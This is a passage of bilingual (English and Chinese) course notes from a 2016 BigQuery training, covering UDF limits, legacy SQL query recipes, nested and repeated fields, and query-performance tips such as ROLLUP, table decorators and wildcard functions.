&lt;li&gt;No charge for loading/exporting data  &lt;/li&gt;
&lt;li&gt;Loading from Cloud Storage Nearline reduces performance  &lt;/li&gt;
&lt;li&gt;Data in Cloud Storage available to other services  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 5: Pricing and Quotas&lt;/h1&gt;
&lt;p&gt;要自己把費用算的很精確太難了，&lt;br /&gt;
Google Cloud Platform 有各種不同的計費方式，&lt;br /&gt;
這邊的重點當然還是放在怎麼省錢，&lt;br /&gt;
順便瞭解一下計費方式。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 6: Clauses and Functions&lt;/h1&gt;
&lt;h2&gt;UDF Constraints&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Max output data size: 5 MB per input row  &lt;/li&gt;
&lt;li&gt;Max number of UDFs that can run concurrently per user = 3  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;Native code JavaScript functions are not supported&lt;/em&gt;  &lt;/li&gt;
&lt;li&gt;The DOM objects Window, Document and Node, and functions that require them, are unsupported  &lt;/li&gt;
&lt;li&gt;Bitwise operations in JavaScript handle only the most significant 32 bits  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;UDF Best Practices&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Use UDF test tool to debug to avoid incurring BigQuery charges  &lt;/li&gt;
&lt;li&gt;Avoid persistent mutable state  &lt;ul&gt;
&lt;li&gt;Do not store or access mutable state in UDF calls  &lt;/li&gt;
&lt;li&gt;Each BQ node has local javascript processing environment that may produce local values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use memory efficiently to avoid memory exhaustion on local JavaScript environments  &lt;/li&gt;
&lt;li&gt;Explicitly list SELECT columns instead of SELECT * (not supported)  &lt;/li&gt;
&lt;li&gt;Pre-filter input to limit the size of data on which UDF will run  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Recipes&lt;/h2&gt;
&lt;p&gt;投影片裡的範例不知道是不是故意排版的很醜讓人看不懂...&lt;br /&gt;
其實只要照下面把 Query statement 排版一下&lt;br /&gt;
再從最裡面的 Query 看到最外面就滿好懂了&lt;br /&gt;
只是像一些 BigQuery 特有的 function: &lt;code&gt;EVERY()&lt;/code&gt;, &lt;code&gt;SOME()&lt;/code&gt;, &lt;code&gt;LAG()&lt;/code&gt; 之類的&lt;br /&gt;
只好到 &lt;a href="https://cloud.google.com/bigquery/docs/reference/legacy-sql"&gt;https://cloud.google.com/bigquery/docs/reference/legacy-sql&lt;/a&gt; 察看文件了  &lt;/p&gt;
&lt;h3&gt;Pivot&lt;/h3&gt;
&lt;p&gt;Find 100 largest words in Shakespeare’s works and display the number of occurrences of those words in four of Shakespears more popular works.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    word,  
    SUM(IF(corpus = &amp;#39;kinglear&amp;#39;, corpus_total, 0)) AS kinglear,  
    SUM(IF(corpus = &amp;#39;tempest&amp;#39;, corpus_total, 0)) AS tempest,  
    SUM(IF(corpus = &amp;#39;macbeth&amp;#39;, corpus_total, 0)) AS macbeth,  
    SUM(IF(corpus = &amp;#39;hamlet&amp;#39;, corpus_total, 0)) AS hamlet,  
    SUM(corpus_total) AS [total]  
FROM (  
    SELECT  
        word,  
        LENGTH(word) AS word_len,  
        corpus,  
        SUM(word_count) AS corpus_total  
    FROM [publicdata:samples.shakespeare]  
    WHERE LENGTH(word) &amp;gt; 10  
    GROUP BY word, word_len, corpus  
)  
GROUP BY word, word_len  
ORDER BY word_len DESC  
LIMIT 100  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Cohort Analysis&lt;/h3&gt;
&lt;p&gt;Counts of Wikipedia contributors who contribute only to pages on Manning brothers vs those who contributed to Manning brothers pages and other pages. Query highlights EVERY and SOME functions.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    peyton_all,  
    peyton_some,  
    eli_all,  
    eli_some,  
    COUNT(1) AS NUM,  
    AVG(edits) AS avg_edits  
FROM (  
    SELECT  
        contributor_id,  
        EVERY(peyton_edit) AS peyton_all,  
        SOME(peyton_edit) AS peyton_some,  
        EVERY(eli_edit) AS eli_all,  
        SOME(eli_edit) AS eli_some,  
        COUNT(1) AS edits  
    FROM (  
        SELECT  
            contributor_id,  
            (LOWER(title) CONTAINS &amp;#39;peyton manning&amp;#39;) AS peyton_edit,  
            (LOWER(title) CONTAINS &amp;#39;eli manning&amp;#39;) AS eli_edit  
        FROM [publicdata:samples.wikipedia]  
    )  
    GROUP BY contributor_id  
    HAVING peyton_all OR peyton_some OR eli_all OR eli_some  
)  
GROUP BY peyton_all, peyton_some, eli_all,eli_some  
ORDER BY peyton_all, peyton_some, eli_all,eli_some  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Trailing Averages&lt;/h3&gt;
&lt;p&gt;Demonstrates windowing functions to calculate moving average on number Trailing avg of user activities in github.&lt;br /&gt;
Outermost query combines trailing values into a weighted average paying attention to missing values.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    start_date,  
    ((num_0 + if(num_1 &amp;gt; -1, num_1, num_0) * 0.5 + if(num_2 &amp;gt; -1, num_2, num_0) * 0.25) / 1.75) AS smooth_num  
FROM (  
    SELECT  
        start_date, num_0,  
        LAG(num_0, 1, integer(-1)) OVER (ORDER BY start_date) AS num_1,  
        LAG(num_0, 2, INTEGER(-1)) OVER (ORDER BY start_date) AS num_2  
    FROM (  
        SELECT  
            DATE(created_at) as start_date,  
            INTEGER(COUNT(1)) num_0  
        FROM [publicdata:samples.github_timeline]  
        GROUP BY start_date  
    )  
)  
ORDER BY smooth_num DESC  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;Day 2: 2016/12/16&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 7: Nested, Repeated, and Nested Repeated Fields&lt;/h1&gt;
&lt;h2&gt;Nested Field&lt;/h2&gt;
&lt;p&gt;"type": "RECORD"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting nested fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;A nested record field adds a named substructure to a row of data  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to organize related information  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Nested Schema and Data&lt;/h3&gt;
&lt;p&gt;Schema  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[{&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
    {&amp;quot;name&amp;quot;: &amp;quot;title&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;ISBN&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;}  
    ]  
}]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Data (Newline-delimited JSON)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;randolph&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;The Beginning&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;213423422&amp;quot; } }  
{&amp;quot;name&amp;quot;: &amp;quot;charles&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;Fortunate Few&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;993032933&amp;quot; } }  
{&amp;quot;name&amp;quot;: &amp;quot;james&amp;quot;, &amp;quot;book&amp;quot;: {&amp;quot;title&amp;quot;: &amp;quot;Homeward Bound&amp;quot;, &amp;quot;ISBN&amp;quot;: &amp;quot;884920039&amp;quot; } }  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Nested Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery automatically flattens nested fields when querying  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT * ... results in columns &amp;lt;record_name&amp;gt;_&amp;lt;nested_field_name&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To query a specific nested field:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT name, book.title FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 7.1&lt;/h2&gt;
&lt;p&gt;CSV 無法表示 nest 結構，所以要上傳有 nested fields 的 data 的話，只能用 JSON 或 AVRO  &lt;/p&gt;
&lt;h2&gt;Repeated Fields&lt;/h2&gt;
&lt;p&gt;"mode": "REPEATED"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting repeated fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;A repeated field adds an &lt;em&gt;array&lt;/em&gt; of data inside a single field or record  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to denormalize a foreign table  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Repeated Schema and Data&lt;/h3&gt;
&lt;p&gt;Schema  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[  
{&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot; },  
{&amp;quot;name&amp;quot;: &amp;quot;city&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot; },  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot; }  
]  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Data  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;randy&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Tucson&amp;quot;, &amp;quot;Houston&amp;quot;, &amp;quot;Seattle&amp;quot;], &amp;quot;book&amp;quot;: [&amp;quot;The Fudge&amp;quot;]}  
{&amp;quot;name&amp;quot;: &amp;quot;charlie&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Tucson&amp;quot;, &amp;quot;Seattle&amp;quot;, &amp;quot;Redmond&amp;quot;], &amp;quot;book&amp;quot;: []}  
{&amp;quot;name&amp;quot;: &amp;quot;cynthia&amp;quot;, &amp;quot;city&amp;quot;: [&amp;quot;Houston&amp;quot;, &amp;quot;Austin&amp;quot;], &amp;quot;book&amp;quot;: [&amp;quot;The Fudge&amp;quot;, &amp;quot;Outlaws&amp;quot;]}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A query such as &lt;code&gt;SELECT * ...&lt;/code&gt; produces an error:  &lt;ul&gt;
&lt;li&gt;Cannot output multiple independently repeated fields at the same time  &lt;/li&gt;
&lt;li&gt;一定只能 flatten 其中一個 repeated field (下面 Querying Multiple Repeated Fields 的作法）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Querying one repeated field, yields automatically flattened result  &lt;ul&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT name, book FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Querying Multiple Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;FLATTEN operator unrolls multiple repeated fields  &lt;ul&gt;
&lt;li&gt;One record for each of the values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT * FROM (FLATTEN ([dataset.table], city))&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Lab 7.2&lt;/h3&gt;
&lt;p&gt;BigQuery will automatically flatten a single repeated field (in this case, "city").&lt;br /&gt;
Additional (independent) repeated fields in a query each require the use of the FLATTEN statement.&lt;br /&gt;
A query on 5 independently repeating fields will require 4 FLATTEN statements.  &lt;/p&gt;
&lt;h2&gt;Nested Repeated Fields&lt;/h2&gt;
&lt;p&gt;"type": "RECORD"&lt;br /&gt;
"mode": "REPEATED"  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports importing and exporting nested repeated fields in JSON and AVRO files  &lt;/li&gt;
&lt;li&gt;Combine nested and repeated fields to denormalize a &lt;em&gt;one-to-many&lt;/em&gt; relationship  &lt;/li&gt;
&lt;li&gt;Useful as a mechanism to organize related information  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: JSON Nested Repeated Schema&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;author&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
{&amp;quot;name&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
        {&amp;quot;name&amp;quot;: &amp;quot;title&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REQUIRED&amp;quot;},  
        {&amp;quot;name&amp;quot;: &amp;quot;checked_out&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;timestamp&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;}  
    ]  
},  
{&amp;quot;name&amp;quot;: &amp;quot;citiesLived&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;RECORD&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;, &amp;quot;fields&amp;quot;:  
    [  
        {&amp;quot;name&amp;quot;: &amp;quot;place&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;},  
        {&amp;quot;name&amp;quot;: &amp;quot;yearsLived&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;integer&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;REPEATED&amp;quot;}  
    ]  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Example: JSON Nested Repeated Data&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;author&amp;quot;: &amp;quot;melville&amp;quot;, &amp;quot;book&amp;quot;: [{&amp;quot;title&amp;quot;: &amp;quot;Moby Dick&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;2014-12-12 14:23&amp;quot;, &amp;quot;2013-04-03 12:13&amp;quot;]}], &amp;quot;citiesLived&amp;quot;: [{&amp;quot;place&amp;quot;: &amp;quot;Denver, CO&amp;quot;, &amp;quot;yearsLived&amp;quot; :[&amp;quot;1986&amp;quot;, &amp;quot;1987&amp;quot;]}]}  
{&amp;quot;author&amp;quot;: &amp;quot;hardy&amp;quot;, &amp;quot;book&amp;quot;: [ {&amp;quot;title&amp;quot;: &amp;quot;Return of the Native&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1984-05-30 12:12&amp;quot;, &amp;quot;1986-03-12 00:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] }, {&amp;quot;title&amp;quot;: &amp;quot;The Mayor of Casterbridge&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1983-06-23 12:12&amp;quot;, &amp;quot;1986-03-12 00:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] } ], &amp;quot;citiesLived&amp;quot;: [ {&amp;quot;place&amp;quot;: &amp;quot;Austin, TX&amp;quot;, &amp;quot;yearsLived&amp;quot; : [&amp;quot;1982&amp;quot;, &amp;quot;1983&amp;quot;, &amp;quot;1984&amp;quot;] }, {&amp;quot;place&amp;quot;: &amp;quot;Dublin, CA&amp;quot;, &amp;quot;yearsLived&amp;quot; : [&amp;quot;1992&amp;quot;, &amp;quot;1999&amp;quot;, &amp;quot;2000&amp;quot;]}]}  
{&amp;quot;author&amp;quot;: &amp;quot;koontz&amp;quot;, &amp;quot;book&amp;quot;: [ {&amp;quot;title&amp;quot;: &amp;quot;Velocity&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;1990-06-10 12:10&amp;quot;, &amp;quot;2000-03-11 10:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;] }, {&amp;quot;title&amp;quot;: &amp;quot;Intensity&amp;quot;, &amp;quot;checked_out&amp;quot;: [&amp;quot;2003-06-23 02:12&amp;quot;, &amp;quot;2004-03-12 20:00&amp;quot;, &amp;quot;1992-05-03 04:32&amp;quot;]}]}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Querying Nested Repeated Fields&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A query such as &lt;code&gt;SELECT * ...&lt;/code&gt; produces an error:  &lt;ul&gt;
&lt;li&gt;Cannot output multiple independently repeated fields at the same time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example: &lt;code&gt;SELECT author, book.title, book.checked_out FROM [dataset.table]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Using the WITHIN Keyword&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WITHIN keyword works with aggregate functions  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT fullName, COUNT(children.name) WITHIN RECORD FROM [dataset.tableId]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WITHIN RECORD&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Aggregates data in the repeated values within the record  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WITHIN &amp;lt;node&amp;gt;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Aggregates data in the repeated values within a node  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT fullName, count(citiesLived.place) WITHIN RECORD, citiesLived.place, count(citiesLived.yearsLived) WITHIN citiesLived FROM [dataset.tableId]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要瞭解 Record 的結構層級，才能比較有效的使用 Within。  &lt;/p&gt;
&lt;h3&gt;Lab 7.3&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;REAPETED&lt;/code&gt; and &lt;code&gt;NETSTED&lt;/code&gt; Record 的時候，&lt;br /&gt;
仍然要注意只能同時有一個 REAPETED field，&lt;br /&gt;
否則就得使用 &lt;code&gt;FLATTEN&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 8: Query Performance&lt;/h1&gt;
&lt;h2&gt;JOIN and GROUP BY – How They Affect Performance&lt;/h2&gt;
&lt;h3&gt;JOIN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When possible, avoid CROSS JOIN  &lt;/li&gt;
&lt;li&gt;Each row from first table is joined to every row in second table returning large amounts of data  &lt;/li&gt;
&lt;li&gt;May result in “resources exceeded” errors  &lt;/li&gt;
&lt;li&gt;Window functions often more efficient  &lt;ul&gt;
&lt;li&gt;例如：一個小時做一個 window  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The 8MB right-side table join limit no longer applies.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GROUP BY&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;GROUP BY&lt;/code&gt; when the number of distinct groups is small (low cardinality)  &lt;ul&gt;
&lt;li&gt;Aggregation of data performed in shards  &lt;/li&gt;
&lt;li&gt;Low cardinality means shards do not shuffle data  &lt;/li&gt;
&lt;li&gt;High performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Large &lt;code&gt;GROUP BY&lt;/code&gt; is less optimal  &lt;ul&gt;
&lt;li&gt;建議不要做，但如果不得已的話還是可以做啦。  &lt;/li&gt;
&lt;li&gt;High cardinality requires aggregation performed by multiple shards  &lt;/li&gt;
&lt;li&gt;Shards produce hash key for each value and shuffle data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ROLLUP - Legacy SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use &lt;code&gt;ROLLUP&lt;/code&gt; function in legacy SQL for large GROUP BY  &lt;/li&gt;
&lt;li&gt;Adds extra rows to result that represent partial aggregations  &lt;/li&gt;
&lt;li&gt;The fields in the GROUP BY must be in the SELECT (declares which columns to process).  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    year,  
    is_male,  
    COUNT(1) AS COUNT  
FROM  
    publicdata:samples.natality  
WHERE  
    year &amp;gt;= 2000 AND year &amp;lt;=2002  
GROUP BY  
    ROLLUP(year, is_male)  
ORDER BY  
    year, is_male  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+------+---------+----------+  
| year | is_male | count    |  
+------+---------+----------+  
| NULL | NULL    | 12122730 |  
| 2000 | NULL    | 4063823  |  
| 2000 | false   | 1984255  |  
| 2000 | true    | 2079568  |  
| 2001 | NULL    | 4031531  |  
| 2001 | false   | 1970770  |  
| ...                       |  
| 2002 | true    | 2060857  |  
+------+---------+----------+  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Example: Large GROUP BY&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    LogEdits,  
    COUNT(contributor_id) Contributors  
FROM (  
    SELECT  
        contributor_id,  
        INTEGER(LOG10(COUNT(*))) LogEdits  
    FROM  
        [publicdata:samples.wikipedia]  
    GROUP BY contributor_id  
)  
GROUP BY LogEdits  
ORDER BY LogEdits DESC  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Table Decorators&lt;/h2&gt;
&lt;h3&gt;BigQuery Table Decorators&lt;/h3&gt;
&lt;p&gt;只有要查有異動的資料的話，使用 Decorators 就好，可以節省資料量。&lt;br /&gt;
不過 7 天之內要做，因為只會保留 7 天。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use to perform the most cost-effective query of a subset of your data  &lt;/li&gt;
&lt;li&gt;Table decorators can be used whenever a table is read  &lt;/li&gt;
&lt;li&gt;Copying a table, exporting a table, or listing data  &lt;/li&gt;
&lt;li&gt;Can also be used to undelete a table within 2 days on a best-effort basis  &lt;/li&gt;
&lt;li&gt;Currently supported in legacy SQL only  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Table Decorator Types&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Snapshot decorators  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&amp;lt;time&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time must be within last 7 days  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;@0&lt;/code&gt; references oldest snapshot  &lt;/li&gt;
&lt;li&gt;Relative time is negative  &lt;/li&gt;
&lt;li&gt;Absolute time is positive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Range decorators  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&amp;lt;time 1&amp;gt;-&amp;lt;time 2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time must be within last 7 days  &lt;/li&gt;
&lt;li&gt;References data between &lt;code&gt;&amp;lt;time 1&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;time 2&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Time 2 is optional and defaults to ‘now’  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Example: Snapshot Table Decorator&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/"&gt;http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;@-14400000&lt;/code&gt; - is a reference to a snapshot of the table at -14400000 milliseconds since the current time  &lt;ul&gt;
&lt;li&gt;14400000 milliseconds == 14400 seconds == 4 hours  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT count(*)  
FROM [publicdata:samples.shakespe are@-14400000]  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Wildcards&lt;/h2&gt;
&lt;h3&gt;Wildcard Functions - Legacy SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Cost-effective way to query data from a set of “sharded” tables  &lt;ul&gt;
&lt;li&gt;Only the tables that match the wildcard are accessed  &lt;/li&gt;
&lt;li&gt;Limits BigQuery data charges  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Equivalent to UNION of tables matched by wildcard  &lt;/li&gt;
&lt;li&gt;Limits:  &lt;ul&gt;
&lt;li&gt;&lt;em&gt;No query can reference more than 1,000 tables (even via views)&lt;/em&gt;  &lt;/li&gt;
&lt;li&gt;The query planner collects table metadata which can have a performance impact for a large number of shards  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;code&gt;TABLE_DATE_RANGE(prefix, timestamp1, timestamp2)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;Queries daily tables that overlap with the time range between &lt;code&gt;&amp;lt;timestamp1&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;timestamp2&amp;gt;&lt;/code&gt;.&lt;br /&gt;
Table names must have the following format: &lt;code&gt;&amp;lt;prefix&amp;gt;&amp;lt;day&amp;gt;&lt;/code&gt;, where &lt;code&gt;&amp;lt;day&amp;gt;&lt;/code&gt; is in the format YYYYMMDD.&lt;br /&gt;
You can use date and time functions to generate the timestamp parameters.&lt;br /&gt;
For example:&lt;br /&gt;
+ &lt;code&gt;TIMESTAMP('2012-10-01 02:03:04')&lt;/code&gt;&lt;br /&gt;
+ &lt;code&gt;DATE_ADD(CURRENT_TIMESTAMP(), -7, 'DAY')&lt;/code&gt;  &lt;/p&gt;
&lt;h4&gt;&lt;code&gt;TABLE_DATE_RANGE_STRICT(prefix, timestamp1, timestamp2)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;This function is equivalent to &lt;code&gt;TABLE_DATE_RANGE&lt;/code&gt;.&lt;br /&gt;
The only difference is that if any daily table is missing in the sequence,&lt;br /&gt;
&lt;code&gt;TABLE_DATE_RANGE_STRICT&lt;/code&gt; fails and returns a &lt;code&gt;Not Found: Table &amp;lt;table_name&amp;gt; error&lt;/code&gt;.  &lt;/p&gt;
&lt;h4&gt;&lt;code&gt;TABLE_QUERY(dataset, expr)&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;Queries tables whose names match the supplied expr.&lt;br /&gt;
The expr parameter must be represented as a string and must contain an expression to evaluate.&lt;br /&gt;
For example, &lt;code&gt;'length(table_id) &amp;lt; 3'&lt;/code&gt;.  &lt;/p&gt;
&lt;h4&gt;Wildcard Function Examples&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT ...  
FROM  
    TABLE_DATE_RANGE(  
        dataset.log,  
        TIMESTAMP(&amp;#39;2015-01-01&amp;#39;),  
        TIMESTAMP(&amp;#39;2015-01-03&amp;#39;)  
     )  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Wildcard Tables - Standard SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Query multiple tables using concise SQL statements  &lt;/li&gt;
&lt;li&gt;Wildcard table represents union of all tables that match the wildcard expression (like wildcard functions)  &lt;/li&gt;
&lt;li&gt;Useful when dataset contains multiple, similarly named tables with compatible schemas  &lt;/li&gt;
&lt;li&gt;Each row in wildcard table contains special column containing value matched by wildcard character  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
